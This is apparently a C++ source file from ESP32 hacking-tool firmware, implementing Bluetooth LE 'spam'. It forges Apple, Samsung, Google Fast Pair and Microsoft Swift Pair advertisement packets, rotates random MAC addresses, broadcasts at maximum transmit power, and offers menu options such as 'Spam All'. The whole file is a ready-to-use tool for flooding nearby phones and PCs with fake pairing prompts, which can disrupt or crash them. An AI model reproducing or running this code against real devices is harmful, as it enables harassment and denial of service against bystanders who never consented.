#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <NimBLEDevice.h>
#include "esp_mac.h"
#include <globals.h>

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) || defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

enum EBLEPayloadType { Microsoft, SourApple, AppleJuice, Samsung, Google };

const uint8_t IOS1[] = {
    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b,
    0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12,
    0x16
};

const uint8_t IOS2[] = {
    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27,
    0x0b, 0x09, 0x02, 0x1e, 0x24
};

struct DeviceType {
    uint32_t value;
};

const DeviceType android_models[] = {
    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A},
    {0x00000B}, {0x00000D}, {0x000007}, {0x090000},
    {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE},
    {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400},
    {0x1E89A7}, {0xCD8256}, {0x0000F0}, {0xF00000},
    {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0},
    {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7},
    {0x038B91}, {0x02F637}, {0x02D886}, {0xF00000},
    {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205},
    {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91},
    {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452},
    {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18},
    {0x1E955B}, {0x06AE20}, {0x06C197}, {0x06C95C},
    {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C},
    {0x07F426}, {0x054B2D}, {0x0660D7}, {0x0903F0},
    {0xD99CA1}, {0x77FF67}, {0xAA187F}, {0xDCE9EA},
    {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB},
    {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
};

const int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));

struct WatchModel {
    uint8_t value;
};

const WatchModel watch_models[26] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04},
    {0x05}, {0x06}, {0x07}, {0x08}, {0x09},
    {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12},
    {0x13}, {0x14}, {0x15}, {0x16}, {0x17},
    {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E},
    {0x20}
};

static char randomNameBuffer[12];
const char *generateRandomName() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 8 + 2;
    for (int i = 0; i < len; ++i) {
        randomNameBuffer[i] = charset[rand() % 52];
    }
    randomNameBuffer[len] = '\0';
    return randomNameBuffer;
}

void generateRandomMac(uint8_t *mac) {
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02; // Locally administered, Unicast
}

NimBLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
    AdvData.setFlags(0x06);

    switch (Type) {
        case Microsoft: {
            const char *Name = generateRandomName();
            uint8_t name_len = strlen(Name);
            uint8_t raw[31];
            uint8_t i = 0;
            raw[i++] = 6 + name_len;
            raw[i++] = 0xFF;
            raw[i++] = 0x06; raw[i++] = 0x00; raw[i++] = 0x03; raw[i++] = 0x00; raw[i++] = 0x80;
            memcpy(&raw[i], Name, name_len);
            AdvData.addData(raw, 7 + name_len);
            break;
        }
        case AppleJuice: {
            if (random(2) == 0) {
                uint8_t packet[26] = {
                    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07,
                    IOS1[random() % sizeof(IOS1)],
                    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00
                };
                AdvData.addData(packet, 26);
            } else {
                uint8_t packet[23] = {
                    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                    0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                    IOS2[random() % sizeof(IOS2)],
                    0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                    0x00, 0x00
                };
                AdvData.addData(packet, 23);
            }
            break;
        }
        case SourApple: {
            uint8_t packet[17];
            packet[0] = 16; packet[1] = 0xFF; packet[2] = 0x4C; packet[3] = 0x00;
            packet[4] = 0x0F; packet[5] = 0x05; packet[6] = 0xC1;
            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
            packet[7] = types[random() % sizeof(types)];
            esp_fill_random(&packet[8], 3);
            packet[11] = 0x00; packet[12] = 0x00; packet[13] = 0x10;
            esp_fill_random(&packet[14], 3);
            AdvData.addData(packet, 17);
            break;
        }
        case Samsung: {
            uint8_t model = watch_models[random(26)].value;
            uint8_t Samsung_Data[15] = {
                0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02,
                0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
                model
            };
            AdvData.addData(Samsung_Data, 15);
            break;
        }
        case Google: {
            uint32_t model = android_models[random(android_models_count)].value;
            uint8_t Google_Data[14] = {
                0x03, 0x03, 0x2C, 0xFE, 0x09, 0x16, 0x2C, 0xFE,
                (uint8_t)((model >> 16) & 0xFF),
                (uint8_t)((model >> 8) & 0xFF),
                (uint8_t)(model & 0xFF),
                0x02, 0x0A, (uint8_t)((rand() % 120) - 100)
            };
            AdvData.addData(Google_Data, 14);
            break;
        }
    }
    return AdvData;
}

static void runLiveSpam(int choice, String customName = "") {
    BLEDevice::init("");
    NimBLEAdvertising *pAdv = BLEDevice::getAdvertising();
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    int count = 0;
    while (!check(EscPress)) {
        uint8_t macAddr[6];
        generateRandomMac(macAddr);
        esp_base_mac_addr_set(macAddr);

        NimBLEAdvertisementData adv;
        String label = "";

        if (choice == 6) { // Custom
            adv.setFlags(0x06);
            adv.setName(customName.c_str());
            label = customName;
        } else if (choice == 5) { // Spam All
            EBLEPayloadType types[] = { Google, Samsung, Microsoft, SourApple, AppleJuice };
            adv = GetUniversalAdvertisementData(types[count % 5]);
            label = "Sequential";
        } else {
            EBLEPayloadType t;
            switch(choice) {
                case 2: t = Microsoft; label = "Windows"; break;
                case 3: t = Samsung; label = "Samsung"; break;
                case 4: t = Google; label = "Android"; break;
                case 7: t = SourApple; label = "SourApple"; break;
                case 8: t = AppleJuice; label = "AppleJuice"; break;
                default: return;
            }
            adv = GetUniversalAdvertisementData(t);
        }

        pAdv->setAdvertisementData(adv);
        pAdv->start();
        displayTextLine(label + " Spamming... (" + String(count++) + ")");
        vTaskDelay(150 / portTICK_PERIOD_MS);
        pAdv->stop();
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
    returnToMenu = true;
}

void aj_adv(int ble_choice) {
    String customName = "";
    if (ble_choice == 6) customName = keyboard("", 10, "Name to spam");
    runLiveSpam(ble_choice, customName);
}

void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
    BLEDevice::init(DeviceName);
    NimBLEAdvertising *pAdv = BLEDevice::getAdvertising();
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    NimBLEBeacon myBeacon;
    myBeacon.setManufacturerId(0x4c00);
    myBeacon.setMajor(5); myBeacon.setMinor(88);
    myBeacon.setSignalPower(0xc5);
    myBeacon.setProximityUUID(NimBLEUUID(BEACON_UUID));

    NimBLEAdvertisementData adv;
    adv.setFlags(0x1A);
    adv.setManufacturerData(myBeacon.getData());
    pAdv->setAdvertisementData(adv);

    drawMainBorderWithTitle("iBeacon");
    padprintln("UUID: " + String(BEACON_UUID));
    padprintln("Press Any key to STOP");

    while (!check(AnyKeyPress)) {
        uint8_t macAddr[6];
        generateRandomMac(macAddr);
        esp_base_mac_addr_set(macAddr);
        pAdv->start();
        vTaskDelay(100 / portTICK_PERIOD_MS);
        pAdv->stop();
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

void legacySubMenu() {
    std::vector<Option> legacyOptions = {
        {"SourApple", []() { aj_adv(7); }},
        {"AppleJuice", []() { aj_adv(8); }},
        {"Back", []() { returnToMenu = true; }}
    };
    loopOptions(legacyOptions, MENU_TYPE_SUBMENU, "Apple Spam (Legacy)");
}

void spamMenu() {
    std::vector<Option> options = {
        {"Apple Spam", []() { appleSubMenu(); }},
        {"Apple Spam (Legacy)", []() { legacySubMenu(); }},
        {"Windows Spam", []() { aj_adv(2); }},
        {"Samsung Spam", []() { aj_adv(3); }},
        {"Android Spam", []() { aj_adv(4); }},
        {"Spam All", []() { aj_adv(5); }},
        {"Spam Custom", []() { aj_adv(6); }},
        {"Back", []() { returnToMenu = true; }}
    };
    loopOptions(options, MENU_TYPE_SUBMENU, "Bluetooth Spam");
}
